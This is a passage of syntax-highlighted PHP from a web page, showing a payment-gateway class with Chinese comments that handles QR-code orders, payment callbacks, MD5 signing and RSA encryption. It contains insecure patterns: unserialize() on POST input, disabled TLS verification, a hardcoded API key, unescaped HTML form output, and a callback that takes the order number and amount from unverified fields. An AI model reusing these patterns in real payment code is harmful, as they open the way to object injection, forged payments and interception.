class=\"line\">        $result = D(<span class=\"string\">'accountRecharge'</span>)-&gt;getOneCoupon(<span class=\"string\">'id'</span>, <span class=\"keyword\">array</span>(<span class=\"string\">'order_sn'</span> =&gt; $retOderNo, <span class=\"string\">'status'</span> =&gt; <span class=\"number\">0</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">empty</span>($result)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219004</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'返回数据成功,但订单表没有查到相应未完成的订单号，'</span> . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        D(<span class=\"string\">'accountRecharge'</span>)-&gt;save([<span class=\"string\">'remark'</span> =&gt; $retOderPayNo], [<span class=\"string\">'order_sn'</span> =&gt; $retOderNo]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 用于安全验证返回url是否非法</span></span><br><span class=\"line\">        $shortQrcodrUrl =<span class=\"keyword\">$this</span>-&gt;shortUrl($retOderPayQrcodrUrl, <span class=\"string\">'5cf1028991d2c405942b1569@f15436319999938d84e5f8b7d25e9dda'</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$shortQrcodrUrl) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">219005</span>;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'msg'</span>]  = <span class=\"string\">'支付二维码生成失败！'</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] . <span class=\"string\">'）'</span> . <span class=\"keyword\">$this</span>-&gt;payName . <span class=\"string\">'二维码获取成功，但转换短链接失败'</span> . print_r($resultArr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        session::set(<span class=\"string\">'qrcode_url'</span>, $shortQrcodrUrl);</span><br><span class=\"line\">        session::set(<span class=\"string\">'pay_url'</span>, <span class=\"string\">''</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//type =1 返回二维码数据</span></span><br><span class=\"line\">        $ret =  [</span><br><span class=\"line\">            <span class=\"string\">'type'</span>     =&gt; $config[<span class=\"string\">'payType'</span>][$data[<span class=\"string\">'pay_type'</span>]][<span class=\"string\">'request_type'</span>],</span><br><span class=\"line\">            <span class=\"string\">'code_url'</span> =&gt; $shortQrcodrUrl,</span><br><span class=\"line\">            <span class=\"string\">'pay_url'</span>  =&gt; <span class=\"string\">''</span>,</span><br><span class=\"line\">            <span class=\"string\">'order_no'</span> =&gt; $orderInfo,</span><br><span class=\"line\">            <span class=\"string\">'modes'</span>    =&gt; $data[<span class=\"string\">'pay_model'</span>]</span><br><span class=\"line\">        ];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'code'</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;retArr[<span class=\"string\">'data'</span>] = $ret;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;retArr;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 支付回调处理</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $postData data：回调返回的数据，payment_Id：支付类型ID</span></span><br><span class=\"line\"><span class=\"comment\">     * &#123;<span class=\"doctag\">@inheritDoc</span>&#125;</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@see</span> PayInfo::doPaycallBack()</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> array $this-&gt;$retArr;</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">doPaycallBack</span><span class=\"params\">($postData)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//接收回调后 返回 ok;</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'ok'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//处理post回调数据</span></span><br><span class=\"line\">        $data       = json_decode($postData[<span class=\"string\">'data'</span>], <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        $reqdata    = $data[<span class=\"string\">'reqdata'</span>];</span><br><span class=\"line\">        $config     = unserialize($postData[<span class=\"string\">'config'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        payLog(<span class=\"string\">'chengyi.txt'</span>,print_r($postData, <span class=\"keyword\">true</span>).<span class=\"string\">'----996--'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//判断字符串是否需要 urldecode解</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (strpos($reqdata, <span class=\"string\">'%'</span>)) &#123;</span><br><span class=\"line\">            $reqdata =  urldecode($reqdata);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!is_array($config)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219020</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知,获取数据库配置错误！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$reqdata) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219021</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知:获取重要参数错误！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取私钥</span></span><br><span class=\"line\">        $private_key = <span class=\"keyword\">$this</span>-&gt;privateKeyStr($config[<span class=\"string\">'merchantPrivateKey'</span>]);</span><br><span class=\"line\">        <span class=\"comment\">//解密</span></span><br><span class=\"line\">        $dataJson    = <span class=\"keyword\">$this</span>-&gt;privateDecrypt($reqdata, $private_key);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$dataJson) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219022</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知：支付解密失败！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        $arr = json_decode($dataJson, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        $arr[<span class=\"string\">'partner'</span>] = $config[<span class=\"string\">'merchantID'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//去除不需要参入验签的字段</span></span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($arr[<span class=\"string\">\"sysnumber\"</span>]);</span><br><span class=\"line\">        <span class=\"keyword\">unset</span>($arr[<span class=\"string\">\"attach\"</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//验证签名</span></span><br><span class=\"line\">        $re = <span class=\"keyword\">$this</span>-&gt;payVerify($arr, $config[<span class=\"string\">'merchantKey'</span>]);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!$re) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219023</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知：验签失败！'</span>  . print_r($arr, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($arr[<span class=\"string\">'orderstatus'</span>]) || $arr[<span class=\"string\">'orderstatus'</span>] != <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] = <span class=\"number\">219024</span>;</span><br><span class=\"line\">            payLog(<span class=\"string\">'payerror.log'</span>, <span class=\"string\">'（'</span> . <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>] . <span class=\"string\">'）支付异步通知：支付失败！'</span>  . print_r($data, <span class=\"keyword\">true</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'code'</span>]  = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'order_no'</span>]  = $data[<span class=\"string\">'ordernumber'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'amount'</span>]    = $data[<span class=\"string\">'paymoney'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;orderInfo[<span class=\"string\">'serial_no'</span>] = $data[<span class=\"string\">'sysnumber'</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;orderInfo;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [get_sign 拼接签名字符串]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $arr 数组</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]      [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_sign</span><span class=\"params\">($arr)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">\t\t$signmd5=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">foreach</span>($arr <span class=\"keyword\">as</span> $x=&gt;$x_value)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>($signmd5==<span class=\"string\">\"\"</span>)&#123;</span><br><span class=\"line\">\t\t\t\t$signmd5 =$signmd5.$x .<span class=\"string\">'='</span>. $x_value;</span><br><span class=\"line\">\t\t\t&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">\t\t\t\t$signmd5 = $signmd5.<span class=\"string\">'&amp;'</span>.$x .<span class=\"string\">'='</span>. $x_value;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> $signmd5;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [publicKeyStr 公钥字符串处理]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $publicStr 公钥字符串</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]            [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>   <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">publicKeyStr</span><span class=\"params\">($publicStr)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $public_key = <span class=\"string\">\"-----BEGIN PUBLIC KEY-----\\r\\n\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (str_split($publicStr,<span class=\"number\">64</span>) <span class=\"keyword\">as</span> $str)&#123;</span><br><span class=\"line\">            $public_key .= $str . <span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $public_key .=<span class=\"string\">\"-----END PUBLIC KEY-----\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $public_key;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">      * [publicEncrypt 公钥加密]</span></span><br><span class=\"line\"><span class=\"comment\">      * <span class=\"doctag\">@param</span>  [type] $publicKey 公钥</span></span><br><span class=\"line\"><span class=\"comment\">      * <span class=\"doctag\">@param</span>  [type] $data      加密字符串</span></span><br><span class=\"line\"><span class=\"comment\">      * <span class=\"doctag\">@return</span> [type]            [description]</span></span><br><span class=\"line\"><span class=\"comment\">      */</span></span><br><span class=\"line\">      <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">publicEncrypt</span><span class=\"params\">($publicKey, $data)</span></span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        $key = openssl_get_publickey($publicKey);</span><br><span class=\"line\"></span><br><span class=\"line\">        $original_arr = str_split($data,<span class=\"number\">117</span>);</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($original_arr <span class=\"keyword\">as</span> $o) &#123;</span><br><span class=\"line\">            $sub_enc = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">            openssl_public_encrypt($o,$sub_enc,$key);</span><br><span class=\"line\">            $original_enc_arr[] = $sub_enc;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        openssl_free_key($key);</span><br><span class=\"line\">        $original_enc_str = base64_encode(implode(<span class=\"string\">''</span>,$original_enc_arr));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $original_enc_str;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [paramToHtmlForm form表单方法]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $url    请求URL</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $params 数组 请求参数</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]         [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">paramToHtmlForm</span><span class=\"params\">($url,$params)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $def_url = <span class=\"string\">\"&lt;form id='form' name='payForm' action='\"</span>.$url.<span class=\"string\">\"' method='POST'&gt;\\r\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($params <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">            $def_url .=<span class=\"string\">\"&lt;input type='hidden' name='\"</span>.$key.<span class=\"string\">\"' value='\"</span>.$value.<span class=\"string\">\"'&gt;\\r\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $def_url .=<span class=\"string\">\"&lt;input type='submit' value='确认提交'&gt;&lt;/form&gt;&lt;script language='javascript'&gt;window.onload=function()&#123;document.payForm.submit();&#125;&lt;/script&gt;\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $def_url;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [httpRequest http请求]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $url  请求URL</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $data 请求参数 json字符串</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type]       [description]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpRequest</span><span class=\"params\">($url,$data)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, <span class=\"string\">\"POST\"</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class=\"keyword\">FALSE</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class=\"keyword\">FALSE</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_USERAGENT, <span class=\"string\">'Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)'</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HTTPHEADER, <span class=\"keyword\">array</span>(<span class=\"string\">'Content-Type: application/json'</span>,<span class=\"string\">'Content-Length: '</span> . strlen($data)));</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_AUTOREFERER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        $tmpInfo = curl_exec($ch);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (curl_errno($ch)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> curl_error($ch);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $tmpInfo;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     *[payVerify 支付付验签]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $result [返回的参数]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> [type] $md5    [MD5]</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">payVerify</span><span class=\"params\">($result,$md5)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $signStr = $result[<span class=\"string\">'sign'</span>];</span><br><span class=\"line\">        $sign_array = <span class=\"keyword\">array</span>();</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($result <span class=\"keyword\">as</span> $k =&gt; $v) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($k !== <span class=\"string\">'sign'</span>)&#123;</span><br><span class=\"line\">                $sign_array[$k] = $v;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $sign  = md5(<span class=\"keyword\">$this</span>-&gt;get_sign($sign_array).$md5);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($signStr != $sign)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">CurlQuery</span><span class=\"params\">($url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//设置附加HTTP头</span></span><br><span class=\"line\">        $addHead = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">\"Content-type: application/json\"</span></span><br><span class=\"line\">        );</span><br><span class=\"line\">        $curl_obj = curl_init();</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_HTTPHEADER, $addHead);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($curl_obj, CURLOPT_TIMEOUT, <span class=\"number\">15</span>);</span><br><span class=\"line\">        $result = curl_exec($curl_obj);</span><br><span class=\"line\">        curl_close($curl_obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $result;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//根据长网址获取短网址</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">shortUrl</span><span class=\"params\">($long_url, $appkey)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $long_url = urlencode($long_url);</span><br><span class=\"line\">        $url = <span class=\"string\">'http://mrw.so/api.php?format=json&amp;url='</span> . $long_url . <span class=\"string\">'&amp;key='</span> . $appkey . <span class=\"string\">'&amp;expireDate='</span> . date(<span class=\"string\">\"Y-m-d\"</span>,strtotime(<span class=\"string\">\"+3 day\"</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//获取请求结果</span></span><br><span class=\"line\">        $result = <span class=\"keyword\">$this</span>-&gt;CurlQuery($url);</span><br><span class=\"line\">        $json = json_decode($result);</span><br><span class=\"line\">        <span class=\"comment\">//异常情况返回false</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($json-&gt;err) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> $json-&gt;url;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 提交表单数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $post_data 表单提交数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> string $url 表单提交接口</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> string</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpHtml</span><span class=\"params\">($post_data, $url)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $html = <span class=\"string\">'&lt;html&gt;'</span>;</span><br><span class=\"line\">        $html = <span class=\"string\">'&lt;head&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/head&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;body onLoad=\"document.dinpayForm.submit();\"&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;form id=\"payFrom\" name=\"dinpayForm\" method=\"get\" action=\"'</span> . $url . <span class=\"string\">'\"&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> ($post_data <span class=\"keyword\">as</span> $key =&gt; $value) &#123;</span><br><span class=\"line\">            $html .= <span class=\"string\">'&lt;input type=\"hidden\" name=\"'</span> . $key . <span class=\"string\">'\" value=\"'</span> . $value . <span class=\"string\">'\"/&gt;'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/form&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/body&gt;'</span>;</span><br><span class=\"line\">        $html .= <span class=\"string\">'&lt;/html&gt;'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> $html;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 调用第三方接口，提交数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> string $url 第三方接口url</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> array $postdata 提交数据</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span> array[]|mixed[] 返回数据</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">httpPost</span><span class=\"params\">($data, $url, $path=<span class=\"string\">''</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        $ch = curl_init();</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_POST, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class=\"keyword\">true</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class=\"number\">1</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_CAINFO, $path);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HEADER, <span class=\"number\">0</span>);</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_HTTPHEADER,<span class=\"keyword\">array</span>(<span class=\"string\">'Content-Type: application/json; charset=utf-8'</span>,<span class=\"string\">'Content-Length:'</span> . strlen($data)));</span><br><span class=\"line\">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        $response = curl_exec($ch);</span><br><span class=\"line\">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">'code'</span> =&gt; $httpCode, <span class=\"string\">'data'</span> =&gt; $response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * [privateKeyStr 私钥钥字符串处理]</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span>  [type] $privatekey 